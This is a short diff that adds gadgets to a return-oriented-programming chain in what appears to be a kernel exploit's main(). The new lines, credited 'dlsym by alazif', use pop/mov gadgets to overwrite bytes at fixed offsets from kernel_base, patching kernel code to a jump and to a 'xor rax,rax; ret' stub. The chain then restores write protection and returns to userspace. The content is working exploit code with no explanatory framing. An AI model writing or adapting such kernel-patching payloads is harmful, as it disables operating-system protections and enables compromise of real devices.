@@ -807,6 +807,17 @@ int main()
         __builtin_gadget_addr("pop rax"),
         0x9090,
         __builtin_gadget_addr("mov [rdi], ax"),
+        //dlsym by alazif
+        __builtin_gadget_addr("pop rdi"),
+        kernel_base + 0x4523c4,
+        __builtin_gadget_addr("pop rax"),
+        0xe990,
+        __builtin_gadget_addr("mov [rdi], ax"),
+        __builtin_gadget_addr("pop rdi"),
+        kernel_base + 0x29a30,
+        __builtin_gadget_addr("pop rax"),
+        0xc3c03148,
+        __builtin_gadget_addr("mov [rdi], eax"),
         //reset wp & return to userspace
         kernel_base + KERNEL_READ_CR0,
         __builtin_gadget_addr("sti"),
